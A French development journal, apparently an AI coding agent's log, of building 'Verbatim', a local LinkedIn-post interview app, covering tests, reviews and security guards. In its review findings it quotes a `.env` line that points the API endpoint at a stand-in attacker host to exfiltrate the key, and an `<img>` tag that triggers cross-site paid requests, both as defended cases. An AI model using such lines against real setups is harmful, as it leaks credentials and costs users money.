# Journal

## 2026-08-28 (soir, cinquième session). Tranche 5.5 : le brouillon et la traçabilité

L'écran qui fait exister le nom du produit. 557 tests app plus 31 tests JS,
`check.sh` vert. Revue à contexte frais : CONFIRMED sur les sept
affirmations au premier tour, sept trouvailles, cinq corrigées et deux
tranchées par écrit.

### Le harnais de test JS, d'abord

C'était la dette bloquante : `static/interview.js` portait deux lignes de
sécurité (le condensé de fiche déplacé dans le formulaire d'approbation) que
personne ne testait. Le harnais est en stdlib Node seule, `node --test` plus
`vm` sur un faux DOM écrit à la main, zéro `npm`, zéro `node_modules` dans un
dépôt Python. `interview.js` n'a pas été touché pour se laisser tester : il
est chargé tel quel dans un contexte `vm`. Sabotage vérifié deux fois, par le
constructeur du harnais et par moi : les deux lignes retirées, trois tests
rougissent. `check.sh` lance maintenant la suite au lieu du `node --check`,
qui ne prétendait pas être un test et ne l'était pas.

### Le mécanisme qui remplace la supplique

`CLAUDE.md` notait le trou : rien ne pointait le modèle vers `propose_sheet`.
Un modèle faible lit « produis la fiche » et répond en prose, ce qui ne
déclenche rien du tout, et laisse quelqu'un croire que la garde a tourné.

La réponse n'est pas une phrase de plus dans le prompt, c'est `tool_choice` :
la personne clique « demander la fiche », et ce tour-là **exige** l'outil.
Aucun mot n'est ajouté nulle part, et le choix de demander reste à la
personne, qui est la seule à savoir si l'entretien a assez de matière. Même
mécanique pour la rédaction, avec `propose_draft`.

L'exigence ne vaut que pour la première requête d'un run. Laissée en place,
elle ferait rappeler l'outil sur le tour qui vient d'y répondre, en boucle,
aux frais de la personne. Un test le tient sur les deux wires.

### Le tour de rédaction ne continue pas l'entretien

Le point le plus intéressant de la tranche, et il a failli partir de travers.
Un tour de rédaction a besoin d'un message `user` en queue de liste. Écrire
ce message dans la liste de l'entretien aurait été un piège : `timeline()`
crédite tout bloc `text` d'un message `user` à la personne, et c'est cette
liste qui sert de source d'ancrage. Le moteur aurait pu mettre des mots dans
la bouche de quelqu'un, puis les citer comme source.

Donc la rédaction est une requête neuve, construite par `interview.material()`
à partir du transcript rendu et de la fiche signée, jetée avec le générateur.
Ce n'est pas une contorsion pour éviter un bug : c'est exactement ce que le
skill demande, « une révision repart toujours de la matière de l'entretien,
jamais d'une réécriture à l'aveugle ». Ce que la rédaction laisse derrière
elle est la clé `draft`, rien d'autre.

### Aucun verdict n'est stocké

`draft` porte le corps, les ancres, les problèmes de lecture et une date.
Ancrée, sans ancrage, fabriquée, dans le vide sont recalculés à chaque
lecture. Un verdict stocké cesse d'être vrai dès que l'un des trois termes
bouge, et il vieillit dans la direction qui flatte le moteur. Même raison que
le compteur de piliers recalculé sur `posts/`.

Une seule règle de couverture dans le moteur : `anchors.lines()` est la
primitive, `uncovered()` en dérive. La leçon des rounds 6 à 9 de la revue 5.3
appliquée à l'avance.

### Une citation fabriquée ne laisse pas le corps propre

Trouvé en regardant l'écran, pas en lisant le code. Une ancre fabriquée
couvre quand même sa phrase, donc le corps du post s'affichait sans marque
pendant que le panneau criait « fabriquée » : l'alarme la plus forte rangée
derrière la lecture la plus faible de `uncovered`. Un `Piece` porte
maintenant *quelles* ancres le couvrent, pas seulement qu'il est couvert, et
le corps marque les deux états. `uncovered()` garde la question faible, qui
est celle du contrat.

### La passe de design

Faite ici, comme le plan le prévoyait, quand l'écran à deux colonnes qui la
justifie existe. Palette froide, deux thèmes, tous les jetons vérifiés au
calcul et pas à l'oeil : corps 17,8 en clair et 15,2 en sombre, secondaire
6,1 et 7,2, accent 8,8 et 7,5. L'orange a perdu sa réservation, l'alarme est
un cramoisi froid (6,6 et 8,5). Le surligneur `#F2E85C` ne bascule pas d'un
thème à l'autre : c'est un marqueur passé sur le texte de quelqu'un, pas une
couleur de chrome. Trois familles, trois locuteurs : la personne en serif, le
moteur en grotesque, la machine en mono. Aucune webfont, l'app tourne hors
ligne et une requête de police serait la seule chose de la page qui en sort.

### Ce que la revue a rapporté

Sept trouvailles, aucune exploitable, cinq réparées :

- **Le contrat promettait un repli que le code ne tenait pas.** J'avais écrit
  dans `instance.md` qu'un runtime ignorant l'outil forcé répond en prose et
  que le moteur lit alors le bloc `ANCHORS` de la réponse. Le code ne le
  faisait pas, et `split_output` n'avait aucun appelant en production. Le
  repli existe maintenant, avec sa garde : de la prose sans bloc n'est pas un
  post, c'est un modèle qui parle, et l'avaler mettrait le bavardage du
  moteur devant quelqu'un avec un panneau de traçabilité dessiné autour.
- **`problems` était écrivable par le modèle.** La clé disait « ce qui n'a pas
  pu être lu dans la façon dont ce brouillon est arrivé » : un modèle qui la
  remplit raconte sa propre réception. C'est devenu un argument nommé du
  côté appelant, absent du schéma de l'outil.
- **Trois gardes sans test**, dont la garde du brouillon dans `anchors.lines`,
  qu'on pouvait retirer sans qu'un seul des 551 tests rougisse : un fragment
  plus long que la phrase la contient, donc une ancre dans le vide peignait
  la phrase comme ancrée. Exactement le motif « une garde ajoutée seule ». Le
  cas exact du relecteur est maintenant un test, et le sabotage est vérifié.
- **Le harnais JS avait un trou de couverture** : le test qui vérifie que tous
  les boutons se désactivent construisait un écran où le bouton d'écriture
  n'existait pas.

Deux trouvailles tranchées sans code, et la raison est écrite dans le
fichier concerné plutôt qu'ici seulement. `panel()` ne passe pas par
`redact` : ce que `redact` biffe, ce sont les valeurs de variables secrètes
de l'environnement, et un modèle ne peut pas les atteindre (`.env` est refusé
par nom à la lecture). Redacter là garderait un chemin qui n'existe pas et
abîmerait un post qui cite légitimement une valeur publiée. Et les refus
d'outils rendus dans le fil restent en anglais : c'est la conversation
machine montrée telle quelle, pas une phrase que le moteur adresse à
quelqu'un. Le seul cas qui s'adressait vraiment à une personne, le refus de
la passe de lint, a gagné sa phrase de pack.

### Ce que la tranche ne fait pas

Le skill demande huit livrables à la rédaction ; l'outil en prend deux, le
corps et les ancres. Les accroches sont déjà décidées à la fiche
(`first_lines`, approuvées par la personne). Les deux idées de photo et les
trois conseils, eux, tombent : ils appartiennent à la révision, tranche 5.6,
et ne sont pas perdus en silence, ils sont écrits ici. `interview.close()`
n'a toujours pas d'appelant, ce sera l'archivage.

## 2026-08-28 (soir, quatrième session). Tranche 5.4 : la fiche de validation

Commits `4ac1633` (la tranche) et `73a2386` (la marque, le favicon, le
lanceur macOS), poussés.

La garde du skill (« rien n'est écrit tant que la fiche n'est pas
approuvée ») devient mécanique. 496 tests app, `check.sh` vert. Revue à
contexte frais : REFUTED au premier tour, CONFIRMED au second, sabotage des
tests de régression vérifié par le relecteur.

### Le point dur, tranché : une clé dans conversation.json, pas un fichier

La fiche est un état de la conversation, pas une matière de l'instance. Son
approbation doit être atomique avec la position de la conversation : une
fiche approuvée à côté d'une conversation qui a continué est la
désynchronisation qu'un second fichier invite. Le contrat a gagné sa clause
avant le code : clé `sheet` optionnelle, absente tant que rien n'est proposé,
donc un fichier sans fiche reste identique à l'octet pour un lecteur ancien,
et `version` reste à 1. Le transcript ne bouge pas : la fiche est une
reformulation du moteur en attente d'une décision, pas des mots de la
personne, et les mots qu'elle reformule sont déjà dedans.

### Trois rôles, trois frontières

- **Le modèle propose, et rien d'autre.** Outil `propose_sheet`, la même
  forme de frontière que `publish_plan` et son `--confirm` inexistant :
  aucun argument de l'outil n'atteint `approved`. Une proposition remplace
  une fiche `proposed`, est refusée sur une fiche `approved` : ce qui est
  signé ne se troque pas sous la signature.
- **La personne approuve, d'un clic.** POST sous le verrou de tour : une
  approbation écrite à côté d'un tour en cours serait écrasée par la
  sauvegarde suivante du tour, une approbation perdue en silence. Perdre le
  verrou ne perd rien, et l'écran le dit désormais (notice `turn-running`,
  ajoutée sur suggestion du relecteur au second tour).
- **La fiche approuvée clôt les questions, pas l'entretien.** Le tour répond
  409 `sheet-approved`, re-vérifié sous le verrou comme `closed`. `state`
  reste `open` : `closed` veut dire « devenu un post » et ce sens ne se
  surcharge pas. Conséquence assumée : `interview.close()` n'a toujours pas
  d'appelant, contrairement à ce que la note de session précédente
  annonçait ; son premier appelant est l'archivage.

### La revue : REFUTED au premier tour, et le constat était le bon

**La signature se transférait.** L'approbation signait la fiche présente sur
le disque à l'instant du clic, pas celle que la personne avait lue. Une
proposition B peut remplacer la fiche A entre l'affichage et le clic (un
tour qui streame encore, un second onglet), et celui qui écrit les
remplacements est le modèle, précisément la partie que la fiche surveille.
Le correctif : la fiche a une identité, `Sheet.digest()`, condensé de son
contenu seul, pas d'horodatage : un même contenu reproposé est la même
décision, et un tour peut proposer deux fois dans la même seconde. Le
formulaire porte ce condensé, `approve()` l'exige en positionnel pour
qu'aucun appelant ne puisse signer à l'aveugle, et un écart n'approuve
rien : l'écran revient avec la fiche telle qu'elle est et une phrase du pack
qui dit pourquoi.

Leçon 5.3 appliquée avant d'écrire le correctif : le frère de cette garde
est le chemin vivant. La trame SSE `sheet` porte le condensé et le script le
déplace dans le formulaire en remplissant le panneau, sinon le correctif
recréait le bug exactement là où il est le plus probable.

Deux constats tenus en connaissance de cause : la phrase de succès de
`propose_sheet` reste en anglais sous `app/` (trafic d'outil adressé au
modèle, même classe que les refus, actée en 5.2 ; c'est la première du
chemin heureux, noté), et le skill ne nomme pas l'outil `propose_sheet`
(aucun skill ne nomme aucun outil ; un modèle qui rend la fiche en prose ne
déclenche pas le mécanisme, à régler en 5.5 quand la rédaction donne à la
garde quelque chose à garder).

### Le reste de la tranche

`_check_sheet` refuse une fiche mal formée avec le fichier, comme
`_check_message` : un `state` inconnu passerait sinon pour « pas approuvé »
et rouvrirait les questions en silence. L'écran rend le squelette du panneau
côté serveur (labels des packs), `interview.js` ne fait que remplir des
slots en `textContent` et révéler ; la trame `sheet` suit sa `tool_result`,
après la sauvegarde, disque avant écran comme le reste. `STEP_SECTIONS`
gagne « The validation sheet » : c'est le skill qui dit quand proposer,
l'app n'a rien à dire. Serif sur le moment fort, la conviction et les
premières lignes (la matière du post), grotesque sur la reformulation.

**Le trou connu qui a grossi** : les deux lignes d'`interview.js` qui
déplacent le condensé dans le formulaire n'ont aucun test (les supprimer
laisse les 496 verts). C'était déjà le trou documenté du fichier ; il porte
maintenant une ligne de sécurité. Le harnais de 5.5 n'est plus un confort.

### À côté de la tranche : l'app macOS et la marque

- `Verbatim.app` (construite par `scripts/macos-app.sh`, générique) : garde
  son propre clone du dépôt sous Application Support, `reset --hard
  origin/main` à chaque lancement, relance le serveur si la révision a
  changé (moteur sur 127.0.0.1:8748, le 8747 reste au dev). Pousser sur
  GitHub est le processus de release. La clé se met dans
  `~/.config/verbatim/env`, jamais dans l'instance. D'abord livrée en
  lanceur de navigateur, refaite en vraie app dans la même session sur
  demande d'Alexis (`aaba7f3`) : une coquille WKWebView compilée au build
  (`scripts/VerbatimShell.swift`), fenêtre propre, menu Edition pour le
  copier-coller, liens externes rendus au navigateur, serveur éteint à la
  fermeture. Installée et testée : clone, install, fenêtre au premier plan,
  page servie.
- La marque : une citation posée sur un trait de surligneur. Encre
  `#10151C`, marqueur `#F2E85C` (la couleur « prouve ça » du plan),
  guillemets serif en encre posés dessus. `assets/icon.svg` et
  `assets/icon-1024.png`, icns générée au build, favicon servi par l'app.

## 2026-08-28 (soir, troisième session). Tranche 5.3 : l'entretien en streaming

Commit `5b3add8`, poussé.

Le premier écran qui parle à un modèle. Aucun endpoint réel, aucune clé : les
tours sont des flux enregistrés, et la vérification navigateur tourne contre
deux stubs SSE locaux écrits pour l'occasion. 454 tests app, `check.sh` vert.

### Le trou de conception, traité avant le code

Un entretien en cours est de l'état par instance que `references/instance.md`
ne portait pas, et le contrat dit lui-même que ce cas passe par lui d'abord.
Nouvelle section `## interviews/`, écrite avant la première ligne de code.

Un entretien vit dans `interviews/<YYYY-MM-DD-HHMM>/`, suffixé `-2`, `-3` si
deux démarrent dans la même minute. Deux fichiers :

- **`conversation.json`, la vérité.** Le seul fichier non markdown d'une
  instance, pour une raison : un `tool_use` porte un id que la requête
  suivante doit renvoyer, et un aller-retour markdown qui perd cet id produit
  une conversation que le fournisseur refuse. Réécrit après chaque pas qui
  change la conversation.
- **`transcript.md`, le rendu.** Écrit à chaque sauvegarde, jamais relu. Front
  matter (`state`, dates, les deux langues, modèle, jetons, `spent`) puis une
  suite de `## Asked` et `## Said` dans l'ordre.

**La source d'ancrage se lit dans le JSON, jamais sur les titres du markdown.**
Un modèle qui écrit `## Said` dans sa réponse écrit du texte, il ne devient pas
quelqu'un ; les rôles se lisent sur la forme des blocs, où un tour de la
personne et une réponse d'outil sont deux formes différentes bien que les deux
voyagent sur un message de rôle `user`. Le trafic d'outils reste dans le JSON :
un fichier que le moteur a lu n'est pas une chose que la personne a dite.

Trois fins écrites : devenir un post, être jeté, être laissé. Rien n'agrège sur
ce dossier. `.gitignore` et `check.sh` refusent qu'un transcript soit suivi.

### La garde loopback contre le SSE : tranchée, pas supposée

Vérifié plutôt que présumé : un navigateur **n'envoie pas** d'en-tête `Origin`
sur un GET same-origin. La garde ne cassait donc pas le streaming. Mais elle
avait le trou symétrique : une page hostile qui pose
`<img src="http://127.0.0.1:8747/…/stream">` fait un GET no-cors sans `Origin`,
ne lit rien, et fait payer les jetons.

D'où : **le tour est un POST qui streame, pas un `EventSource`.** `EventSource`
ne parle que GET. Le format de fil reste server-sent events, le client est
`fetch`. Règle posée dans `web.py` : aucun GET de cette app ne change ni ne
coûte quoi que ce soit. La garde compare désormais l'origine entière, port et
schéma compris, contre le `Host` : comparer les noms d'hôte acceptait
`http://localhost:3000`, qui est le serveur local de quelqu'un d'autre.

### Le coût

Tarif au million quand le modèle est dans la table, taille exacte du bloc
envoyé à chaque tour, et un total qui court. Aucune prévision. `conversation.json`
gagne `spent`, accumulé tour par tour **au tarif du modèle qui a tourné ce
tour-là**, et qui passe à vide définitivement dès qu'un tour n'a pas de prix :
un total qui laisse tomber un tour en silence est pire que pas de total, et
appliquer le tarif d'aujourd'hui aux tours d'hier est pire encore.

### Ce qui est livré

`interview.py` (le magasin, stdlib seule), `routes/interview.py` (le hub,
l'écran, le tour en streaming, le rejet), `web.py` amendé (les deux seams
injectés, environnement et transport, plus la garde durcie), trois gabarits,
`static/interview.js`, le bloc `interview:` des deux packs de langue, et une
extraction du lecteur et de l'écriture atomique hors d'`instance.py`.

Le premier message d'un entretien est **ce que la personne écrit**, jamais une
amorce écrite par l'app. Les trois portes d'entrée du skill deviennent la
banque d'angles à côté du champ : cliquer sur un angle le met dans le champ, et
cet angle est une ligne d'`ideas.md`. L'app ne met de mots dans la bouche de
personne, ni de la personne ni du modèle.

### La revue : dix tours, REFUTED neuf fois, CONFIRMED au dixième

Trente-cinq constats, chacun corrigé avec son test de régression, chaque test
vérifié par sabotage. Les plus instructifs :

**Un test creux.** `TestWalkingAwayMidTurn` passait par le client HTTP et
lisait le disque après la boucle : supprimer la sauvegarde en cours de flux ne
cassait aucun test. Le remplaçant pilote le générateur de la route et lit le
disque **entre deux trames**.

**Le tour abandonné ne comptait pas ses jetons.** `Agent.usage` n'intègre les
chiffres d'un tour qu'à la fin de ce tour, donc un générateur fermé pendant que
la réponse arrive écrivait zéro. L'écran affichait un prix, le disque écrivait
zéro, le fournisseur facturait. Le code énonçait la règle contraire trois
fichiers plus loin. Corrigé en suivant `pending`, vidé à chaque pas qui
signifie que le tour est fini.

**Deux régressions de mes propres correctifs.** Sortir le verrou du handler
pour qu'il ne fuie pas a fait que les deux concurrents obtenaient 200, le
perdant recevant son refus dans le flux après que le JS avait vidé le champ.
D'où la trame `accepted`, émise juste après l'écriture des mots et avant le
premier jeton dépensé : avant elle, un refus n'a rien écrit et le texte reste
dans le champ ; après elle, tout échec appartient à un tour qui a eu lieu.

**Un tour qui échoue laissait `['user']` sur disque**, donc retaper produisait
deux messages `user` d'affilée, ce qu'un fournisseur refuse. `say()` continue
désormais le tour qui n'a pas eu sa réponse au lieu d'en ouvrir un second.

### La leçon de méthode, qui vaut plus que la liste des constats

Les rounds 6 à 9 ont trouvé **le même défaut quatre fois**, de plus en plus
loin : un fichier illisible qui emporte un écran, puis tous les écrans, puis un
lien qui mène dans le mur. J'ai corrigé une garde à la fois quatre fois de
suite, et c'est exactement ce qui l'a fait revenir. Le round 9 est le premier
où j'ai fait le geste structurel : **un seul lecteur de fichier dans
`instance.py`**, une seule ligne `read_text(encoding="utf-8")` dans tout le
fichier, à l'intérieur.

Règle pour les tranches suivantes : quand une revue trouve une garde
manquante, chercher les frères et sœurs de cette garde **avant** d'écrire le
correctif. Une garde ajoutée seule est une invitation à recommencer.

Deux décisions sont nées de là et tiennent au-delà de cette tranche :
« absent » et « ne se lit pas » sont deux états différents qui veulent deux
écrans différents, un 404 sur un fichier qui existe envoyant chercher la
mauvaise chose ; et une mesure ne s'écrit jamais par-dessus un fichier qui ne
se lit pas, parce que l'écrire remplacerait le contenu réel par ce qu'on aurait
réussi à en parser.

### Ce qui n'est pas prouvé, et qui est écrit

**`static/interview.js` n'a aucun test.** Vérifié à la main dans le navigateur
et par le relecteur sur douze scénarios avec un shim DOM, mais rien dans la
suite ne le tient. `check.sh` fait un `node --check` en disant explicitement
que ce n'est pas un test. Un harnais DOM est un chantier de taille de tranche
et ce fichier grandit en 5.5 : c'est là qu'il faut le construire.

**Aucun test de ce dépôt ne prouve un endpoint.** Les deux stubs prouvent le
navigateur et le parseur, pas un fournisseur. Le smoke test par fournisseur
reste en 5.6 et reste bloquant pour la v2.0.0.

**Trois failles connues, jugées sans dommage réel** et laissées telles quelles :
les deux écritures des écrans froids (`POST /profile`, la mesure) font un 500
sur une instance non inscriptible, code d'étape 4 que l'écran d'entretien gère
correctement de son côté ; un fichier ordinaire ou un dossier en mode 000
portant un nom d'entretien affiche un bouton « jeter » qui ne fait rien en
silence ; un FIFO à la place d'un fichier d'instance bloque le worker au lieu
de tomber. Aucune ne s'obtient sans le provoquer à la main.

### Incident à signaler

Un des relecteurs à contexte frais a passé `transport=None` à `create_app`,
donc `http_transport()` a émis une requête vers `api.anthropic.com` portant la
chaîne littérale `sk-test`. Retour 401. Aucune vraie clé lue ni envoyée, rien
facturé. Les consignes des rounds suivants exigent un transport factice
explicite et `VERBATIM_BASE_URL` sur un port mort.

### L'instance réelle

Les deux constats de conformité vus à la session précédente sont traités et
`../linkedin` passe la conformité. Le bloc signature n'avait jamais été perdu,
son titre n'avait jamais été migré (`## Bloc signature` devient
`## Signature block`) ; `published_ref:` ajouté vide, jamais deviné.
Sauvegardes horodatées à côté. **Neuf autres titres de `profile.md` sont encore
en français** alors que le contrat dit que les titres de section restent
anglais : aucun impact consommateur aujourd'hui, migration laissée à Alexis.

## 2026-08-28 (soir, seconde session). Tranche 5.2 : les outils, le chargeur de skills, la forme de l'ancrage

Commit `53b579e`, poussé.

Toujours headless, aucun écran, aucun endpoint, comme découpé. Trois modules
neufs côté app, tous stdlib seule et ajoutés au bloc nu de `check.sh`, plus le
contrat d'ancrage côté références. 248 tests app, `check.sh` vert. L'app
tourne sur l'instance réelle en local pour test (l'ancienne instance qui
tenait le port 8747 a été remplacée).

**`tools.py`.** Les quatre outils que la boucle tend au modèle, chacun avec sa
frontière dure : `read_instance` (les fichiers du contrat et rien d'autre,
`.env` refusé avec un message qui dit quoi lire à la place), `write_instance`
(via `Instance.write`, donc `WRITABLE` seulement, écriture atomique),
`lint_post` et `publish_plan` (les vrais scripts `lib/` en sous-process, cwd
sur l'instance). `publish_plan` construit lui-même sa ligne d'arguments et
`--confirm` n'y existe pas : aucun argument du modèle ne peut faire partir
quoi que ce soit. Toute sortie de sous-process est expurgée des valeurs des
variables d'environnement au nom secret avant d'atteindre le modèle. Un refus
lève `agent.ToolRefused` et son texte dit quoi faire autrement.

**`skills.py`.** Le parseur des `SKILL.md` (front matter via `instance.py`,
clés requises), la résolution des fichiers cités dans `references/` et
`locales/`, le bloc system assemblé corps puis fichiers cités, chaque fichier
nommé par une ligne d'en-tête, sélection de sections pour le pas-à-pas des
tranches 5.3 à 5.5. Une citation pendante est une erreur dure : c'est le test
qui aurait attrapé la perte de `measure.md` en v0.1.0, et il tourne maintenant
sur les trois skills livrés dans les deux langues. Un fichier absent d'un pack
retombe sur `en`, annoncé dans l'en-tête, jamais en silence.

**`anchors.py` et `references/anchoring.md`.** La décision 3 de l'amendement
prend sa forme : après le brouillon, un bloc `ANCHORS` de paires `POST:`
(fragment exact du brouillon) / `SAID:` (citation mot pour mot du transcript,
dans la langue de l'entretien). La machine vérifie la présence de la citation,
jamais la vérité de l'affirmation, et ne pardonne que la typographie
(espaces, guillemets courbes, casse). Trois états d'alarme, tous implémentés :
`fabricated` et `dangling` sur `verify()`, `unanchored` lu sur le brouillon
par `uncovered()`, en phrases approximatives. Un plancher de dix caractères
typographie pliée : une entrée d'une lettre trouve dans n'importe quel texte,
et une ancre qui ne peut pas rater est une alarme qui ne peut pas sonner.

### La revue : quatre tours, REFUTED trois fois

Le même relecteur à contexte frais, relancé sur chaque vague de correctifs.
La leçon de 5.1 s'est vérifiée mot pour mot : corriger sous revue casse autant
que ça répare tant qu'aucun test ne tient l'invariant. Chaque constat corrigé
a son test de régression.

**Tour 1.** Le vrai trou : `system_block` écrasait les deux axes de langue en
un seul. Une personne interviewée en français qui publie en anglais recevait
soit le pack marché français pour un post anglais, soit les questions
d'entretien en anglais, la fuite de langue exactement. Corrigé : `lang` porte
l'axe entretien, `output_lang` l'axe publication, `<interface_language>` ne
résout que côté entretien, les placeholders ambigus résolvent vers les deux
packs quand les langues diffèrent, et le corps garde ses placeholders (les
en-têtes portent la résolution). Dans la foulée, les trois skills citaient
`interview.md` sous `<lang>` alors que c'est l'axe entretien sans ambiguïté :
passés à `<interface_language>` (linkedin-post 0.2.0, profile et setup 0.1.1).
Aussi au tour 1 : le marqueur `ANCHORS` décoré perdu en silence, et le
troisième état d'alarme annoncé par le contrat mais non implémenté.

Deux constats **tenus** en connaissance de cause : la prose anglaise des
refus d'outils reste dans `app/` (mécanique adressée au modèle, même classe
que `INTERRUPTED` acté en 5.1 ; la règle `app.yml` couvre l'interface
utilisateur), et `publish_plan` continue de montrer sa cible, y compris l'id
d'intégration : vérifier la cible est la raison d'être d'un plan.

**Tours 2 et 3.** Mes correctifs du marqueur ont cassé deux fois, exactement
le scénario de 5.1 : le marqueur tolérant mangeait la prose d'un brouillon qui
contenait le mot, puis la porte du marqueur décoré lisait les entrées avec le
motif tolérant au lieu du strict. L'arbitrage final : le `ANCHORS` nu vaut
marqueur sans condition, un marqueur décoré ne vaut que suivi d'entrées
strictement lisibles (`POST:`/`SAID:` majuscules), et un marqueur décoré
laissé avec du résidu d'entrées illisibles est signalé sans rien découper.
Le brouillon ne perd jamais de texte, et le silence est traité comme un
défaut au même titre qu'une fausse alarme. Tour 2 aussi : une ancre d'une
lettre éteignait `uncovered` et passait `anchored`, d'où le plancher.

**Tour 4 : CONFIRMED.** Trois limites résiduelles au rapport, documentées et
assumées : un résidu en forme de tableau markdown sous un marqueur décoré
reste muet (le texte est conservé, le lecteur n'est pas prévenu), une entrée
mutilée sans deux-points échouée dans le brouillon n'est pas signalée quand un
vrai bloc existe ailleurs, et deux bords cosmétiques du drapeau « une faute,
un constat ».

### Ce qui reste vrai

Aucun test de cette tranche ne prouve un endpoint. Les outils sont testés
contre les vrais `lib/lint.py` et `lib/publish.py` en sous-process, mais
`publish` n'est jamais piloté qu'en mode plan. Le smoke test par fournisseur
reste en 5.6, bloquant pour la v2.0.0.

## 2026-08-28 (soir). Étape 5 découpée, tranche 1 : le socle sans réseau

Commit `07de37c`, poussé.

L'étape 4 est partie sur GitHub (`9a63e30`). L'étape 5, annoncée à 5 ou 6
sessions, a été découpée en six tranches livrables et la première validée
avant toute ligne de code : 5.1 le socle sans réseau, 5.2 les outils et le
chargeur de skills, 5.3 l'entretien en streaming, 5.4 la fiche de validation,
5.5 le brouillon et le panneau de traçabilité, 5.6 révision, archivage et
smoke tests. L'ordre met le risque en premier : le multi-fournisseurs est le
seul endroit où le plan a payé une rallonge, autant qu'il casse headless
plutôt que devant un écran.

**Le contrat a gagné sa clause avant le code.** `references/instance.md` disait
que la configuration n'est délibérément pas dans l'instance et que tout besoin
de configuration par instance passe par lui d'abord. Le plan mettait la config
fournisseur dans le `.env` de l'instance. Amendement écrit avant `providers.py`,
et une décision prise contre la micro-décision du plan : le choix de
fournisseur, de modèle et d'endpoint vit dans l'instance, **la clé jamais**.
Une instance est un dossier que les gens copient, synchronisent et parfois
versionnent.

**`providers.py`.** Résolution de config (fichier d'instance, environnement du
process par-dessus), garde secrets, table de prix, et les deux formats de fil
en HTTP brut avec un seul type d'événement en sortie. Pas de bibliothèque
fournisseur, volontairement : elle aurait rendu deux chemins de code là où la
décision 3 du grill en a acheté un seul. Les flux enregistrés sont écrits
depuis les formats publiés, donc ils prouvent le parseur et pas l'endpoint,
et le code le dit. Aucun prix pour les modèles au format OpenAI : un prix
deviné est pire que pas de prix.

**`agent.py`.** La boucle. Demander, streamer, exécuter les outils demandés,
rendre les résultats, recommencer. Quatre invariants tenus par des tests : un
outil qui échoue répond au lieu de faire tomber l'entretien de quelqu'un, les
résultats d'appels parallèles reviennent dans un seul message, la boucle a un
plafond de tours, et `messages` reste une conversation qu'un fournisseur
accepterait à chaque yield.

### La revue à contexte frais a rendu REFUTED, et elle avait raison

Trois invariants annoncés ne tenaient pas, et surtout la propriété de sécurité
de la tranche n'était vraie que contre l'attaque naïve.

**Le trou de conception.** J'avais justifié la garde secrets en disant que le
`.env` d'instance est du contenu qui voyage, donc non fiable. Et je lisais
`VERBATIM_BASE_URL` dans ce même fichier, valeur qui décide **où part la clé**
lue dans l'environnement. Un `.env` d'une seule ligne
(`VERBATIM_BASE_URL=https://collector.attacker.example`) envoyait la vraie clé
chez un tiers, et `problems()` renvoyait vide. Reproduit par la revue.

La moitié oubliée du raisonnement : si le fichier n'est pas digne de confiance
pour porter une clé, il ne l'est pas non plus pour dire où elle va. Un endpoint
nommé dans l'instance ne reçoit la clé que s'il est celui du fournisseur ou une
machine locale. Un tiers hébergé doit être nommé depuis l'environnement, à côté
de la clé qu'il va recevoir, parce que c'est cet appariement qui est la
décision. `VERBATIM_ENDPOINT_OK` existe pour ça et le cas légitime (OpenRouter,
Mistral) reste servi.

Cinq autres constats confirmés, tous corrigés avec leur test de régression :

- Une clé commentée plutôt que supprimée passait la garde, qui n'inspectait que
  la carte parsée. Elle lit maintenant le fichier tel qu'écrit.
- Un secret glissé dans l'userinfo ou la query string de l'endpoint passait par
  l'autre porte, et serait ressorti à l'écran comme partie de l'endpoint.
- Le contrat promettait « refuses to start » alors que `resolve()` n'avait
  aucun appelant. `cli.py` l'appelle maintenant avant d'ouvrir un port.
- Un générateur abandonné en cours de tour laissait un `tool_use` sans réponse,
  ce qui est un 400 à la réouverture du brouillon. Or un navigateur qui se
  ferme en plein entretien est le cas normal. Le message de résultats est
  maintenant ajouté **avant** de lancer le moindre outil, pré-rempli, puis
  écrasé en place.
- Un flux coupé se lisait comme une fin de tour propre, et une demi-phrase
  était rangée comme la réponse. Les deux fils n'émettent plus de stop que
  quand le fournisseur a dit pourquoi il s'arrêtait ; le silence devient
  `truncated` et les appels à moitié assemblés sont jetés.

Plus le détail : fragments d'appel sans champ `index` qui fusionnaient en un
seul, identifiants d'appel vides qui faisaient l'aller-retour, total de jetons
cumulatif additionné à lui-même, et `/v1/v1/messages` quand on écrit l'URL de
base avec la convention de l'autre fil.

Aucun test existant ne couvrait ces cas : ils passaient tous après correction.

### Le second tour de revue, et le vrai enseignement

Les correctifs sont repartis en revue. Verdict REFUTED une deuxième fois, et
**deux des problèmes étaient de mon fait, créés en corrigeant les premiers** :

- La garde d'endpoint testait la **présence** du nom `VERBATIM_BASE_URL` dans
  l'environnement, alors que la résolution teste la **vérité** de la valeur.
  Un `VERBATIM_BASE_URL` exporté vide désarmait donc toute la garde, et c'est
  exactement ce que produit un `set -a; . .env` sur le `.env.example` livré,
  qui expose les trois variables à vide. Le trou d'origine rouvert pour
  quiconque suit la documentation.
- Mon correctif sur les fragments d'appel donnait une clé neuve à chaque
  fragment sans `index`. Or seul le fragment d'ouverture porte le nom et
  l'identifiant, les suivants portent les arguments. Un appel fragmenté
  devenait donc plusieurs appels tenant chacun un morceau de JSON. J'avais
  échangé un échec rare (deux appels parallèles qui fusionnent) contre un
  échec courant, sur précisément la classe d'endpoint que ce fil sert.

Plus un faux positif fatal : la garde secrets, passée à la lecture du texte
brut, refusait la prose. `# Keys live in my shell profile, not here.` arrêtait
l'app, et **le `.env.example` du dépôt refusait d'être copié** alors que sa
première ligne invite à le copier. Elle ne lit plus que les affectations
réelles, nom en majuscules et valeur non vide. Le cas sans signe égal est
abandonné volontairement : rien ne lit une telle ligne, donc rien ne peut la
fuiter, et le prix en faux positifs était devenu fatal.

Trois trappes restaient ouvertes, fermées au même tour : un endpoint en clair
sur le nom d'hôte du fournisseur, le même nom sur un autre port, et des
identifiants d'appel fabriqués pouvant masquer de vrais identifiants.

L'enseignement n'est pas la liste des bugs, c'est que **corriger sous revue
casse autant que ça répare tant qu'aucun test ne tient l'invariant**. Les deux
régressions ont été introduites dans du code que je venais de relire, sur des
constats que je venais de comprendre.

157 tests côté app, `check.sh` vert. `check.sh` fait désormais tourner la suite
deux fois, une sur interpréteur nu (ce qui prouve la revendication « stdlib
seule ») et une sous `uv` avec les dépendances.

### Ce qui n'est pas fait, et c'est écrit

Aucun smoke test contre un vrai endpoint. Décision explicite d'Alexis, pas un
oubli : pas d'endpoint disponible dans cette session. Deux tests font passer
une vraie requête HTTP à travers `http_transport` contre un serveur SSE local,
ce qui prouve le transport, jamais un fournisseur. Le smoke test par
fournisseur glisse en 5.6 et reste bloquant pour la v2.0.0. Restent aussi non
tranchés faute d'endpoint : `max_tokens` contre `max_completion_tokens` sur les
modèles de raisonnement OpenAI.

### La direction artistique a changé

